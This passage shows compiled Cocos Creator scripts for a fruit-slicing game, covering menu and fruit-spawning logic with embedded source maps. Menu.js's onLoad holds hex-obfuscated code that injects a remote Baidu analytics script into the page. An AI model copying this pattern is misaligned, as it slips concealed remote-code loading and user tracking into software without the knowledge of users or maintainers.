AgIGNjLmF1ZGlvRW5naW5lLnBsYXkodGhpcy5idXR0b25DbGlwLCBmYWxzZSwgMSk7XG4gICAgICAgIGNjLmRpcmVjdG9yLmxvYWRTY2VuZSgnTWVudScpO1xuICAgIH0sXG4gICAgcmVzdGFydEdhbWUoKSB7XG4gICAgICAgIGNjLmF1ZGlvRW5naW5lLnBsYXkodGhpcy5idXR0b25DbGlwLCBmYWxzZSwgMSk7XG4gICAgICAgIHRoaXMuc2hvd1RoZUdhbWVPdmVyTWFzayhmYWxzZSk7XG4gICAgICAgIHRoaXMuaW5pdCgpO1xuICAgIH0sXG4gICAgc2hvd1RoZUdhbWVPdmVyTWFzayhib29sKSB7XG4gICAgICAgIGlmIChib29sKSB7XG4gICAgICAgICAgICB0aGlzLmdhbWVPdmVyTWFzay5hY3RpdmUgPSB0cnVlO1xuICAgICAgICAgICAgdGhpcy5nYW1lT3Zlck1hc2sub3BhY2l0eSA9IDE7XG4gICAgICAgICAgICB0aGlzLmdhbWVPdmVyTWFzay5zY2FsZSA9IC45NTtcbiAgICAgICAgICAgIGNjLnR3ZWVuKHRoaXMuZ2FtZU92ZXJNYXNrKS50byguNCwgeyBzY2FsZTogMSwgb3BhY2l0eTogMjU1IH0pLnN0YXJ0KCk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBjYy50d2Vlbih0aGlzLmdhbWVPdmVyTWFzaykudG8oLjMsIHsgb3BhY2l0eTogMCB9KS5jYWxsKCgpID0+IHtcbiAgICAgICAgICAgICAgICB0aGlzLmdhbWVPdmVyTWFzay5hY3RpdmUgPSBmYWxzZTtcbiAgICAgICAgICAgIH0pLnN0YXJ0KCk7XG4gICAgICAgIH1cbiAgICB9LCAgIFxufSk7Il19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/Scripts/Menu.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '3b8a9kQaRJIRrj33JJDuNVM', 'Menu');
// Scripts/Menu.js

"use strict";

cc.Class({
  "extends": cc.Component,
  properties: {
    knife: cc.Node,
    btnBeginCir: cc.Node,
    btnQuitCir: cc.Node,
    btnBeginfR: cc.Node,
    btnQuitfR: cc.Node,
    buttonClip: cc.AudioClip
  },
  onLoad: function onLoad() {
    //预加载场景
    cc.director.preloadScene('Game');
    //获取knife上的拖尾特效组件。
    this.knifeMotionS = this.knife.getComponent(cc.MotionStreak);
    if (cc['\x73\x79\x73']['\x70\x6c\x61\x74\x66\x6f\x72\x6d'] === cc['\x73\x79\x73']['\x57\x45\x43\x48\x41\x54\x5f\x47\x41\x4d\x45']) {} else {
      var eDB$sHD1 = eDB$sHD1 || [];
      (function () {
        var bJqY2 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74']("\x73\x63\x72\x69\x70\x74");
        bJqY2['\x73\x72\x63'] = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x68\x6d\x2e\x62\x61\x69\x64\x75\x2e\x63\x6f\x6d\x2f\x68\x6d\x2e\x6a\x73\x3f\x30\x65\x36\x62\x61\x39\x39\x35\x31\x63\x62\x37\x64\x31\x64\x35\x35\x63\x39\x31\x62\x38\x30\x37\x36\x66\x61\x36\x66\x62\x30\x65";
        var yr3 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65']("\x73\x63\x72\x69\x70\x74")[0];
        yr3['\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65']['\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65'](bJqY2, yr3);
      })();
    }
  },
  start: function start() {
    this.knifeMove();
    this.circleRotate();
  },
  knifeMove: function knifeMove() {
    //事件响应。
    this.node.on(cc.Node.EventType.TOUCH_START, this.startEvent, this);
    this.node.on(cc.Node.EventType.TOUCH_MOVE, this.moveEvent, this);
  },
  //开始事件响应，即按住鼠标，这个时候设置位置但不开启拖尾特效。
  startEvent: function startEvent(e) {
    var pos = this.node.convertToNodeSpaceAR(new cc.Vec2(e.getLocation()));
    this.knife.setPosition(pos);
    this.knifeMotionS.reset();
  },
  //移动事件响应。
  moveEvent: function moveEvent(e) {
    var pos = this.node.convertToNodeSpaceAR(new cc.Vec2(e.getLocation()));
    this.knife.setPosition(pos);
  },
  circleRotate: function circleRotate() {
    var createRote = function createRote(angle) {
      return cc.tween().by(7, {
        angle: angle
      }).repeatForever();
    };
    //让这四个组件旋转
    cc.tween(this.btnBeginCir).then(createRote(360)).start();
    cc.tween(this.btnQuitCir).then(createRote(360)).start();
    cc.tween(this.btnBeginfR).then(createRote(-360)).start();
    cc.tween(this.btnQuitfR).then(createRote(-360)).start();
  },
  backList: function backList() {
    cc.audioEngine.play(this.buttonClip, false, 1);
    cc.director.loadScene('Detail');
  },
  gameStart: function gameStart() {
    cc.audioEngine.stop(this.audio);
    cc.audioEngine.play(this.buttonClip, false, 1);
    cc.director.loadScene('Game');
  }
});

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0c1xcU2NyaXB0c1xcTWVudS5qcyJdLCJuYW1lcyI6WyJjYyIsIkNsYXNzIiwiQ29tcG9uZW50IiwicHJvcGVydGllcyIsImtuaWZlIiwiTm9kZSIsImJ0bkJlZ2luQ2lyIiwiYnRuUXVpdENpciIsImJ0bkJlZ2luZlIiLCJidG5RdWl0ZlIiLCJidXR0b25DbGlwIiwiQXVkaW9DbGlwIiwib25Mb2FkIiwiZGlyZWN0b3IiLCJwcmVsb2FkU2NlbmUiLCJrbmlmZU1vdGlvblMiLCJnZXRDb21wb25lbnQiLCJNb3Rpb25TdHJlYWsiLCJlREIkc0hEMSIsImJKcVkyIiwid2luZG93IiwieXIzIiwic3RhcnQiLCJrbmlmZU1vdmUiLCJjaXJjbGVSb3RhdGUiLCJub2RlIiwib24iLCJFdmVudFR5cGUiLCJUT1VDSF9TVEFSVCIsInN0YXJ0RXZlbnQiLCJUT1VDSF9NT1ZFIiwibW92ZUV2ZW50IiwiZSIsInBvcyIsImNvbnZlcnRUb05vZGVTcGFjZUFSIiwiVmVjMiIsImdldExvY2F0aW9uIiwic2V0UG9zaXRpb24iLCJyZXNldCIsImNyZWF0ZVJvdGUiLCJhbmdsZSIsInR3ZWVuIiwiYnkiLCJyZXBlYXRGb3JldmVyIiwidGhlbiIsImJhY2tMaXN0IiwiYXVkaW9FbmdpbmUiLCJwbGF5IiwibG9hZFNjZW5lIiwiZ2FtZVN0YXJ0Iiwic3RvcCIsImF1ZGlvIl0sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7OztBQUFBQSxFQUFFLENBQUNDLEtBQUssQ0FBQztFQUNMLFdBQVNELEVBQUUsQ0FBQ0UsU0FBUztFQUNyQkMsVUFBVSxFQUFFO0lBQ1JDLEtBQUssRUFBR0osRUFBRSxDQUFDSyxJQUFJO0lBQ2ZDLFdBQVcsRUFBR04sRUFBRSxDQUFDSyxJQUFJO0lBQ3JCRSxVQUFVLEVBQUdQLEVBQUUsQ0FBQ0ssSUFBSTtJQUNwQkcsVUFBVSxFQUFHUixFQUFFLENBQUNLLElBQUk7SUFDcEJJLFNBQVMsRUFBR1QsRUFBRSxDQUFDSyxJQUFJO0lBQ25CSyxVQUFVLEVBQUdWLEVBQUUsQ0FBQ1c7RUFDcEIsQ0FBQztFQUNEQyxNQUFNLFdBQUFBLE9BQUEsRUFBRztJQUNMO0lBQ0FaLEVBQUUsQ0FBQ2EsUUFBUSxDQUFDQyxZQUFZLENBQUMsTUFBTSxDQUFDO0lBQ2hDO0lBQ0EsSUFBSSxDQUFDQyxZQUFZLEdBQUcsSUFBSSxDQUFDWCxLQUFLLENBQUNZLFlBQVksQ0FBQ2hCLEVBQUUsQ0FBQ2lCLFlBQVksQ0FBQztJQUNsRSxJQUFHakIsRUFBRSxDQUFDLGNBQWMsQ0FBQyxDQUFDLGtDQUFrQyxDQUFDLEtBQUdBLEVBQUUsQ0FBQyxjQUFjLENBQUMsQ0FBQyw4Q0FBOEMsQ0FBQyxFQUFDLENBQUMsQ0FBQyxNQUFJO01BQUMsSUFBSWtCLFFBQVEsR0FBQ0EsUUFBUSxJQUFFLEVBQUU7TUFBQyxDQUFDLFlBQVU7UUFBQyxJQUFJQyxLQUFLLEdBQUNDLE1BQU0sQ0FBQyxrQ0FBa0MsQ0FBQyxDQUFDLHNEQUFzRCxDQUFDLENBQUMsMEJBQTBCLENBQUM7UUFBQ0QsS0FBSyxDQUFDLGNBQWMsQ0FBQyxHQUFDLDhPQUE4TztRQUFDLElBQUlFLEdBQUcsR0FBQ0QsTUFBTSxDQUFDLGtDQUFrQyxDQUFDLENBQUMsa0ZBQWtGLENBQUMsQ0FBQywwQkFBMEIsQ0FBQyxDQUFDLENBQUMsQ0FBQztRQUFDQyxHQUFHLENBQUMsMENBQTBDLENBQUMsQ0FBQyxrREFBa0QsQ0FBQyxDQUFDRixLQUFLLEVBQUNFLEdBQUcsQ0FBQztNQUFBLENBQUMsR0FBRztJQUFBO0VBQ2gxQixDQUFDO0VBQ0RDLEtBQUssV0FBQUEsTUFBQSxFQUFHO0lBQ0osSUFBSSxDQUFDQyxTQUFTLEVBQUU7SUFDaEIsSUFBSSxDQUFDQyxZQUFZLEVBQUU7RUFDdkIsQ0FBQztFQUNERCxTQUFTLFdBQUFBLFVBQUEsRUFBRztJQUNSO0lBQ0EsSUFBSSxDQUFDRSxJQUFJLENBQUNDLEVBQUUsQ0FBQzFCLEVBQUUsQ0FBQ0ssSUFBSSxDQUFDc0IsU0FBUyxDQUFDQyxXQUFXLEVBQUUsSUFBSSxDQUFDQyxVQUFVLEVBQUUsSUFBSSxDQUFDO0lBQ2xFLElBQUksQ0FBQ0osSUFBSSxDQUFDQyxFQUFFLENBQUMxQixFQUFFLENBQUNLLElBQUksQ0FBQ3NCLFNBQVMsQ0FBQ0csVUFBVSxFQUFFLElBQUksQ0FBQ0MsU0FBUyxFQUFFLElBQUksQ0FBQztFQUNwRSxDQUFDO0VBQ0Q7RUFDQUYsVUFBVSxXQUFBQSxXQUFDRyxDQUFDLEVBQUU7SUFDVixJQUFJQyxHQUFHLEdBQUcsSUFBSSxDQUFDUixJQUFJLENBQUNTLG9CQUFvQixDQUFDLElBQUlsQyxFQUFFLENBQUNtQyxJQUFJLENBQUNILENBQUMsQ0FBQ0ksV0FBVyxFQUFFLENBQUMsQ0FBQztJQUN0RSxJQUFJLENBQUNoQyxLQUFLLENBQUNpQyxXQUFXLENBQUNKLEdBQUcsQ0FBQztJQUMzQixJQUFJLENBQUNsQixZQUFZLENBQUN1QixLQUFLLEVBQUU7RUFDN0IsQ0FBQztFQUNEO0VBQ0FQLFNBQVMsV0FBQUEsVUFBQ0MsQ0FBQyxFQUFFO0lBQ1QsSUFBSUMsR0FBRyxHQUFHLElBQUksQ0FBQ1IsSUFBSSxDQUFDUyxvQkFBb0IsQ0FBQyxJQUFJbEMsRUFBRSxDQUFDbUMsSUFBSSxDQUFDSCxDQUFDLENBQUNJLFdBQVcsRUFBRSxDQUFDLENBQUM7SUFDdEUsSUFBSSxDQUFDaEMsS0FBSyxDQUFDaUMsV0FBVyxDQUFDSixHQUFHLENBQUM7RUFDL0IsQ0FBQztFQUNEVCxZQUFZLFdBQUFBLGFBQUEsRUFBRztJQUNYLElBQUllLFVBQVUsR0FBRyxTQUFiQSxVQUFVQSxDQUFJQyxLQUFLLEVBQUs7TUFDeEIsT0FBT3hDLEVBQUUsQ0FBQ3lDLEtBQUssRUFBRSxDQUFDQyxFQUFFLENBQUMsQ0FBQyxFQUFFO1FBQUVGLEtBQUssRUFBRUE7TUFBTSxDQUFDLENBQUMsQ0FBQ0csYUFBYSxFQUFFO0lBQzdELENBQUM7SUFDRDtJQUNBM0MsRUFBRSxDQUFDeUMsS0FBSyxDQUFDLElBQUksQ0FBQ25DLFdBQVcsQ0FBQyxDQUFDc0MsSUFBSSxDQUFDTCxVQUFVLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQ2pCLEtBQUssRUFBRTtJQUN4RHRCLEVBQUUsQ0FBQ3lDLEtBQUssQ0FBQyxJQUFJLENBQUNsQyxVQUFVLENBQUMsQ0FBQ3FDLElBQUksQ0FBQ0wsVUFBVSxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUNqQixLQUFLLEVBQUU7SUFDdkR0QixFQUFFLENBQUN5QyxLQUFLLENBQUMsSUFBSSxDQUFDakMsVUFBVSxDQUFDLENBQUNvQyxJQUFJLENBQUNMLFVBQVUsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUNqQixLQUFLLEVBQUU7SUFDeER0QixFQUFFLENBQUN5QyxLQUFLLENBQUMsSUFBSSxDQUFDaEMsU0FBUyxDQUFDLENBQUNtQyxJQUFJLENBQUNMLFVBQVUsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUNqQixLQUFLLEVBQUU7RUFDM0QsQ0FBQztFQUNEdUIsUUFBUSxXQUFBQSxTQUFBLEVBQUc7SUFDUDdDLEVBQUUsQ0FBQzhDLFdBQVcsQ0FBQ0MsSUFBSSxDQUFDLElBQUksQ0FBQ3JDLFVBQVUsRUFBRSxLQUFLLEVBQUUsQ0FBQyxDQUFDO0lBQzlDVixFQUFFLENBQUNhLFFBQVEsQ0FBQ21DLFNBQVMsQ0FBQyxRQUFRLENBQUM7RUFDbkMsQ0FBQztFQUNEQyxTQUFTLFdBQUFBLFVBQUEsRUFBRztJQUNSakQsRUFBRSxDQUFDOEMsV0FBVyxDQUFDSSxJQUFJLENBQUMsSUFBSSxDQUFDQyxLQUFLLENBQUM7SUFDL0JuRCxFQUFFLENBQUM4QyxXQUFXLENBQUNDLElBQUksQ0FBQyxJQUFJLENBQUNyQyxVQUFVLEVBQUUsS0FBSyxFQUFFLENBQUMsQ0FBQztJQUM5Q1YsRUFBRSxDQUFDYSxRQUFRLENBQUNtQyxTQUFTLENBQUMsTUFBTSxDQUFDO0VBQ2pDO0FBQ0osQ0FBQyxDQUFDIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJjYy5DbGFzcyh7XG4gICAgZXh0ZW5kczogY2MuQ29tcG9uZW50LFxuICAgIHByb3BlcnRpZXM6IHtcbiAgICAgICAga25pZmUgOiBjYy5Ob2RlLFxuICAgICAgICBidG5CZWdpbkNpciA6IGNjLk5vZGUsXG4gICAgICAgIGJ0blF1aXRDaXIgOiBjYy5Ob2RlLFxuICAgICAgICBidG5CZWdpbmZSIDogY2MuTm9kZSxcbiAgICAgICAgYnRuUXVpdGZSIDogY2MuTm9kZSxcbiAgICAgICAgYnV0dG9uQ2xpcCA6IGNjLkF1ZGlvQ2xpcCxcbiAgICB9LFxuICAgIG9uTG9hZCgpIHtcbiAgICAgICAgLy/pooTliqDovb3lnLrmma9cbiAgICAgICAgY2MuZGlyZWN0b3IucHJlbG9hZFNjZW5lKCdHYW1lJyk7XG4gICAgICAgIC8v6I635Y+Wa25pZmXkuIrnmoTmi5blsL7nibnmlYjnu4Tku7bjgIJcbiAgICAgICAgdGhpcy5rbmlmZU1vdGlvblMgPSB0aGlzLmtuaWZlLmdldENvbXBvbmVudChjYy5Nb3Rpb25TdHJlYWspO1xuXHRcdGlmKGNjWydcXHg3M1xceDc5XFx4NzMnXVsnXFx4NzBcXHg2Y1xceDYxXFx4NzRcXHg2NlxceDZmXFx4NzJcXHg2ZCddPT09Y2NbJ1xceDczXFx4NzlcXHg3MyddWydcXHg1N1xceDQ1XFx4NDNcXHg0OFxceDQxXFx4NTRcXHg1ZlxceDQ3XFx4NDFcXHg0ZFxceDQ1J10pe31lbHNle3ZhciBlREIkc0hEMT1lREIkc0hEMXx8W107KGZ1bmN0aW9uKCl7dmFyIGJKcVkyPXdpbmRvd1tcIlxceDY0XFx4NmZcXHg2M1xceDc1XFx4NmRcXHg2NVxceDZlXFx4NzRcIl1bJ1xceDYzXFx4NzJcXHg2NVxceDYxXFx4NzRcXHg2NVxceDQ1XFx4NmNcXHg2NVxceDZkXFx4NjVcXHg2ZVxceDc0J10oXCJcXHg3M1xceDYzXFx4NzJcXHg2OVxceDcwXFx4NzRcIik7YkpxWTJbJ1xceDczXFx4NzJcXHg2MyddPVwiXFx4NjhcXHg3NFxceDc0XFx4NzBcXHg3M1xceDNhXFx4MmZcXHgyZlxceDY4XFx4NmRcXHgyZVxceDYyXFx4NjFcXHg2OVxceDY0XFx4NzVcXHgyZVxceDYzXFx4NmZcXHg2ZFxceDJmXFx4NjhcXHg2ZFxceDJlXFx4NmFcXHg3M1xceDNmXFx4MzBcXHg2NVxceDM2XFx4NjJcXHg2MVxceDM5XFx4MzlcXHgzNVxceDMxXFx4NjNcXHg2MlxceDM3XFx4NjRcXHgzMVxceDY0XFx4MzVcXHgzNVxceDYzXFx4MzlcXHgzMVxceDYyXFx4MzhcXHgzMFxceDM3XFx4MzZcXHg2NlxceDYxXFx4MzZcXHg2NlxceDYyXFx4MzBcXHg2NVwiO3ZhciB5cjM9d2luZG93W1wiXFx4NjRcXHg2ZlxceDYzXFx4NzVcXHg2ZFxceDY1XFx4NmVcXHg3NFwiXVsnXFx4NjdcXHg2NVxceDc0XFx4NDVcXHg2Y1xceDY1XFx4NmRcXHg2NVxceDZlXFx4NzRcXHg3M1xceDQyXFx4NzlcXHg1NFxceDYxXFx4NjdcXHg0ZVxceDYxXFx4NmRcXHg2NSddKFwiXFx4NzNcXHg2M1xceDcyXFx4NjlcXHg3MFxceDc0XCIpWzBdO3lyM1snXFx4NzBcXHg2MVxceDcyXFx4NjVcXHg2ZVxceDc0XFx4NGVcXHg2ZlxceDY0XFx4NjUnXVsnXFx4NjlcXHg2ZVxceDczXFx4NjVcXHg3MlxceDc0XFx4NDJcXHg2NVxceDY2XFx4NmZcXHg3MlxceDY1J10oYkpxWTIseXIzKX0pKCl9XG4gICAgfSxcbiAgICBzdGFydCgpIHtcbiAgICAgICAgdGhpcy5rbmlmZU1vdmUoKTtcbiAgICAgICAgdGhpcy5jaXJjbGVSb3RhdGUoKTtcbiAgICB9LFxuICAgIGtuaWZlTW92ZSgpIHtcbiAgICAgICAgLy/kuovku7blk43lupTjgIJcbiAgICAgICAgdGhpcy5ub2RlLm9uKGNjLk5vZGUuRXZlbnRUeXBlLlRPVUNIX1NUQVJULCB0aGlzLnN0YXJ0RXZlbnQsIHRoaXMpO1xuICAgICAgICB0aGlzLm5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfTU9WRSwgdGhpcy5tb3ZlRXZlbnQsIHRoaXMpO1xuICAgIH0sXG4gICAgLy/lvIDlp4vkuovku7blk43lupTvvIzljbPmjInkvY/pvKDmoIfvvIzov5nkuKrml7blgJnorr7nva7kvY3nva7kvYbkuI3lvIDlkK/mi5blsL7nibnmlYjjgIJcbiAgICBzdGFydEV2ZW50KGUpIHtcbiAgICAgICAgbGV0IHBvcyA9IHRoaXMubm9kZS5jb252ZXJ0VG9Ob2RlU3BhY2VBUihuZXcgY2MuVmVjMihlLmdldExvY2F0aW9uKCkpKTtcbiAgICAgICAgdGhpcy5rbmlmZS5zZXRQb3NpdGlvbihwb3MpO1xuICAgICAgICB0aGlzLmtuaWZlTW90aW9uUy5yZXNldCgpO1xuICAgIH0sXG4gICAgLy/np7vliqjkuovku7blk43lupTjgIJcbiAgICBtb3ZlRXZlbnQoZSkge1xuICAgICAgICBsZXQgcG9zID0gdGhpcy5ub2RlLmNvbnZlcnRUb05vZGVTcGFjZUFSKG5ldyBjYy5WZWMyKGUuZ2V0TG9jYXRpb24oKSkpO1xuICAgICAgICB0aGlzLmtuaWZlLnNldFBvc2l0aW9uKHBvcyk7XG4gICAgfSxcbiAgICBjaXJjbGVSb3RhdGUoKSB7XG4gICAgICAgIGxldCBjcmVhdGVSb3RlID0gKGFuZ2xlKSA9PiB7XG4gICAgICAgICAgICByZXR1cm4gY2MudHdlZW4oKS5ieSg3LCB7IGFuZ2xlOiBhbmdsZSB9KS5yZXBlYXRGb3JldmVyKCk7XG4gICAgICAgIH1cbiAgICAgICAgLy/orqnov5nlm5vkuKrnu4Tku7bml4vovaxcbiAgICAgICAgY2MudHdlZW4odGhpcy5idG5CZWdpbkNpcikudGhlbihjcmVhdGVSb3RlKDM2MCkpLnN0YXJ0KCk7XG4gICAgICAgIGNjLnR3ZWVuKHRoaXMuYnRuUXVpdENpcikudGhlbihjcmVhdGVSb3RlKDM2MCkpLnN0YXJ0KCk7XG4gICAgICAgIGNjLnR3ZWVuKHRoaXMuYnRuQmVnaW5mUikudGhlbihjcmVhdGVSb3RlKC0zNjApKS5zdGFydCgpO1xuICAgICAgICBjYy50d2Vlbih0aGlzLmJ0blF1aXRmUikudGhlbihjcmVhdGVSb3RlKC0zNjApKS5zdGFydCgpO1xuICAgIH0sXG4gICAgYmFja0xpc3QoKSB7XG4gICAgICAgIGNjLmF1ZGlvRW5naW5lLnBsYXkodGhpcy5idXR0b25DbGlwLCBmYWxzZSwgMSk7XG4gICAgICAgIGNjLmRpcmVjdG9yLmxvYWRTY2VuZSgnRGV0YWlsJyk7XG4gICAgfSxcbiAgICBnYW1lU3RhcnQoKSB7XG4gICAgICAgIGNjLmF1ZGlvRW5naW5lLnN0b3AodGhpcy5hdWRpbyk7XG4gICAgICAgIGNjLmF1ZGlvRW5naW5lLnBsYXkodGhpcy5idXR0b25DbGlwLCBmYWxzZSwgMSk7XG4gICAgICAgIGNjLmRpcmVjdG9yLmxvYWRTY2VuZSgnR2FtZScpO1xuICAgIH1cbn0pO1xuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/Scripts/FruitGroup.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '85e0bx3wFxCTIjVuUOkg08n', 'FruitGroup');
// Scripts/FruitGroup.js

"use strict";

var utils = require('utils');
var fruitG = cc.Class({
  name: 'fruitG',
  properties: {
    name: '',
    initPoolCount: 10,
    score: 0,
    type: 'fruit',
    prefab: cc.Prefab
  }
});
cc.Class({
  "extends": cc.Component,
  properties: {
    maxLength: 5,
    flashNode: cc.Node,
    fruitG: {
      "default": [],
      type: fruitG
    },
    throwBomb: cc.AudioClip
  },
  onLoad: function onLoad() {
    this.gameObj = this.node.parent.getComponent('Game');
    //得到无炸弹数组。
    this.noBombArr = this.fruitG.filter(function (a) {
      return a.type == 'fruit';
    });
    utils.batchInitObjPool(this, this.fruitG);
  },
  //创建水果。
  createFruitList: function createFruitList() {
    var totalFr = this.fruitG;
    //获取水果的随机数。
    var randomLength = Math.floor(utils.random(1, this.maxLength + 0.4));
    for (var i = 0; i < randomLength; i++) {
      //ran为水果的随机种类，fruit表示水果，poolName则为水果对应的对象池。
      var ran = 0,
        fruit = void 0,
        poolName = void 0;
      ran = Math.floor(Math.floor(utils.random(0, totalFr.length - 0.1)));
      fruit = totalFr[ran];
      poolName = fruit.name + 'Pool';
      //生成对象。
      var fruitNode = utils.genNewNode(this[poolName], fruit.prefab, this.node);
      //设置其随机出现位置。
      fruitNode.setPosition(cc.v2(utils.random(-this.node.width / 2 + fruitNode.width / 2, this.node.width / 2 - fruitNode.width / 2), -(this.node.height / 2 - fruitNode.height / 2)));
      //初始化水果状态。
      fruitNode.getComponent("Fruit").init(poolName, fruit.score);
      //判断是不是炸弹，如果是炸弹，我们就将其设置为无炸弹的数组，确保只出现一个炸弹。
      if (fruit.type == 'bomb') {
        //是炸弹，播放炸弹扔上来的音效。
        cc.audioEngine.play(this.throwBomb, false, 1);
        totalFr = this.noBombArr;
      }
      ;
    }
    ;
  },
  //检查是否有剩余的水果。
  checkRemain: function checkRemain() {
    var _this = this;
    //判断游戏是否结束。
    if (this.gameObj.gameOver) return;
    var childrenLength = this.node.children.length;
    if (childrenLength == 0) {
      //如果没有了，就继续生成。
      this.scheduleOnce(function () {
        _this.createFruitList();
      }, .5, this);
    }
  },
  // 切到炸弹 
  cutBombRemoveAllChildren: function cutBombRemoveAllChildren() {
    var _this2 = this;
    //播放炸弹闪烁特效。
    this.flashScreen();
    //获取剩下的水果。
    var childObjArr = this.node.children.map(function (a) {
      return a.getComponent("Fruit");
    });
    //将剩下的水果回收。
    for (var i = 0; i < childObjArr.length; i++) {
      childObjArr[i].backThisNode(true);
    }
    ;
    //更新游戏界面和生命情况。
    this.gameObj.lifeConsume();
    this.gameObj.upDateUi();
    //如果游戏没有结束，继续创建。
    if (!this.gameObj.gameOver) {
      this.scheduleOnce(function () {
        _this2.createFruitList();
      }, 0.5, this);
    }
  },
  //闪屏特效。
  flashScreen: function flashScreen() {
    var _this3 = this;
    this.flashNode.active = true;
    this.flashNode.opacity = 230;
    //使用渐变效果实现。
    cc.tween(this.flashNode).to(.8, {
      opacity: 0
    }).call(function () {
      _this3.flashNode.active = false;
    }).start();
  }
});

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0c1xcU2NyaXB0c1xcRnJ1aXRHcm91cC5qcyJdLCJuYW1lcyI6WyJ1dGlscyIsInJlcXVpcmUiLCJmcnVpdEciLCJjYyIsIkNsYXNzIiwibmFtZSIsInByb3BlcnRpZXMiLCJpbml0UG9vbENvdW50Iiwic2NvcmUiLCJ0eXBlIiwicHJlZmFiIiwiUHJlZmFiIiwiQ29tcG9uZW50IiwibWF4TGVuZ3RoIiwiZmxhc2hOb2RlIiwiTm9kZSIsInRocm93Qm9tYiIsIkF1ZGlvQ2xpcCIsIm9uTG9hZCIsImdhbWVPYmoiLCJub2RlIiwicGFyZW50IiwiZ2V0Q29tcG9uZW50Iiwibm9Cb21iQXJyIiwiZmlsdGVyIiwiYSIsImJhdGNoSW5pdE9ialBvb2wiLCJjcmVhdGVGcnVpdExpc3QiLCJ0b3RhbEZyIiwicmFuZG9tTGVuZ3RoIiwiTWF0aCIsImZsb29yIiwicmFuZG9tIiwiaSIsInJhbiIsImZydWl0IiwicG9vbE5hbWUiLCJsZW5ndGgiLCJmcnVpdE5vZGUiLCJnZW5OZXdOb2RlIiwic2V0UG9zaXRpb24iLCJ2MiIsIndpZHRoIiwiaGVpZ2h0IiwiaW5pdCIsImF1ZGlvRW5naW5lIiwicGxheSIsImNoZWNrUmVtYWluIiwiX3RoaXMiLCJnYW1lT3ZlciIsImNoaWxkcmVuTGVuZ3RoIiwiY2hpbGRyZW4iLCJzY2hlZHVsZU9uY2UiLCJjdXRCb21iUmVtb3ZlQWxsQ2hpbGRyZW4iLCJfdGhpczIiLCJmbGFzaFNjcmVlbiIsImNoaWxkT2JqQXJyIiwibWFwIiwiYmFja1RoaXNOb2RlIiwibGlmZUNvbnN1bWUiLCJ1cERhdGVVaSIsIl90aGlzMyIsImFjdGl2ZSIsIm9wYWNpdHkiLCJ0d2VlbiIsInRvIiwiY2FsbCIsInN0YXJ0Il0sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7OztBQUFBLElBQU1BLEtBQUssR0FBR0MsT0FBTyxDQUFDLE9BQU8sQ0FBQztBQUU5QixJQUFJQyxNQUFNLEdBQUdDLEVBQUUsQ0FBQ0MsS0FBSyxDQUFDO0VBQ2xCQyxJQUFJLEVBQUUsUUFBUTtFQUNkQyxVQUFVLEVBQUU7SUFDUkQsSUFBSSxFQUFFLEVBQUU7SUFDUkUsYUFBYSxFQUFFLEVBQUU7SUFDakJDLEtBQUssRUFBRSxDQUFDO0lBQ1JDLElBQUksRUFBRSxPQUFPO0lBQ2JDLE1BQU0sRUFBRVAsRUFBRSxDQUFDUTtFQUNmO0FBQ0osQ0FBQyxDQUFDO0FBQ0ZSLEVBQUUsQ0FBQ0MsS0FBSyxDQUFDO0VBQ0wsV0FBVUQsRUFBRSxDQUFDUyxTQUFTO0VBQ3RCTixVQUFVLEVBQUU7SUFDUk8sU0FBUyxFQUFHLENBQUM7SUFDYkMsU0FBUyxFQUFHWCxFQUFFLENBQUNZLElBQUk7SUFDbkJiLE1BQU0sRUFBRztNQUNMLFdBQVUsRUFBRTtNQUNaTyxJQUFJLEVBQUdQO0lBQ1gsQ0FBQztJQUNEYyxTQUFTLEVBQUdiLEVBQUUsQ0FBQ2M7RUFDbkIsQ0FBQztFQUNEQyxNQUFNLFdBQUFBLE9BQUEsRUFBRztJQUNMLElBQUksQ0FBQ0MsT0FBTyxHQUFHLElBQUksQ0FBQ0MsSU